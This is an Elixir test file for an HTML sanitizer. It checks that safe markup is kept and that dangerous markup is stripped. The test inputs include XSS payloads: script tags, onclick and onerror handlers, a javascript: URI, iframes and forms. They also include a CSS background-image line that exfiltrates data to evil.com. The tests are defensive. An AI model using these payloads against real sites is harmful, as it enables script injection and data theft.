defmodule HeyiAm.HtmlSanitizerTest do
  use ExUnit.Case, async: true

  alias HeyiAm.HtmlSanitizer

  describe "sanitize/1" do
    test "returns nil for nil" do
      assert HtmlSanitizer.sanitize(nil) == nil
    end

    test "returns empty string for empty string" do
      assert HtmlSanitizer.sanitize("") == ""
    end

    test "preserves safe structural HTML" do
      html = "<div class=\"case-study\"><h2>Title</h2><p>Content</p></div>"
      assert HtmlSanitizer.sanitize(html) == html
    end

    test "strips style attributes to prevent CSS data exfiltration" do
      html = "<div style=\"color: red;\">styled</div>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "styled"
      refute result =~ "style="
    end

    test "strips CSS exfiltration via background-image url" do
      html = "<div style=\"background-image: url('https://evil.com/exfil?data=secret')\">content</div>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "content"
      refute result =~ "style="
      refute result =~ "evil.com"
    end

    test "preserves data attributes" do
      html = "<div data-username=\"ben\" data-template=\"editorial\">content</div>"
      assert HtmlSanitizer.sanitize(html) == html
    end

    test "preserves links with https" do
      html = "<a href=\"https://github.com/ben\">link</a>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "https://github.com/ben"
      assert result =~ "link"
    end

    test "preserves images with https src" do
      html = "<img src=\"https://example.com/img.png\" alt=\"screenshot\"/>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "https://example.com/img.png"
      assert result =~ "alt=\"screenshot\""
    end

    test "strips SVG elements (interactive viz added by client JS)" do
      html = "<svg viewBox=\"0 0 100 100\"><rect x=\"0\" y=\"0\" width=\"100\" height=\"100\" fill=\"blue\"></rect></svg>"
      result = HtmlSanitizer.sanitize(html)
      refute result =~ "<svg"
      refute result =~ "<rect"
    end

    test "preserves tables" do
      html = "<table><thead><tr><th>File</th></tr></thead><tbody><tr><td>app.ex</td></tr></tbody></table>"
      assert HtmlSanitizer.sanitize(html) == html
    end

    test "preserves semantic HTML5 tags" do
      html = "<section><article><header>H</header><footer>F</footer></article></section>"
      assert HtmlSanitizer.sanitize(html) == html
    end

    test "strips script tags" do
      html = "<div>safe</div>" <> "<script>alert('xss')<" <> "/script>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "safe"
      refute result =~ "<script"
      # Text content from stripped tags may remain as inert text, which is safe
    end

    test "strips event handlers" do
      html = "<div onclick=\"alert('xss')\">click</div>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "click"
      refute result =~ "onclick"
      refute result =~ "alert"
    end

    test "strips javascript URIs from links" do
      # Build the string without triggering Elixir's keyword syntax parser
      html = "<a href=\"" <> "javascript:alert(1)" <> "\">link</a>"
      result = HtmlSanitizer.sanitize(html)
      refute result =~ "javascript"
    end

    test "strips iframe tags" do
      html = "<div>safe</div><iframe src=\"https://evil.com\"></iframe>"
      result = HtmlSanitizer.sanitize(html)
      assert result =~ "safe"
      refute result =~ "<iframe"
    end

    test "strips object and embed tags" do
      html = "<object data=\"evil.swf\"></object><embed src=\"evil.swf\">"
      result = HtmlSanitizer.sanitize(html)
      refute result =~ "<object"
      refute result =~ "<embed"
    end

    test "strips form elements" do
      html = "<form action=\"/steal\"><input type=\"text\"><button>submit</button></form>"
      result = HtmlSanitizer.sanitize(html)
      refute result =~ "<form"
      refute result =~ "<input"
      refute result =~ "<button"
    end

    test "strips onerror on img" do
      html = "<img src=\"x\" onerror=\"alert('xss')\"/>"
      result = HtmlSanitizer.sanitize(html)
      refute result =~ "onerror"
      refute result =~ "alert"
    end

    test "handles complex nested HTML from CLI render" do
      html = """
      <div class="session-page tpl-editorial">
        <nav class="session-breadcrumb">
          <a href="/ben">ben</a>
        </nav>
        <div class="session-header">
          <h1 class="session-title">Auth Migration</h1>
        </div>
        <div class="session-stats">
          <div class="stat"><span class="stat-value">45m</span></div>
        </div>
      </div>
      """

      result = HtmlSanitizer.sanitize(html)
      assert result =~ "session-page"
      assert result =~ "tpl-editorial"
      assert result =~ "Auth Migration"
    end
  end
end
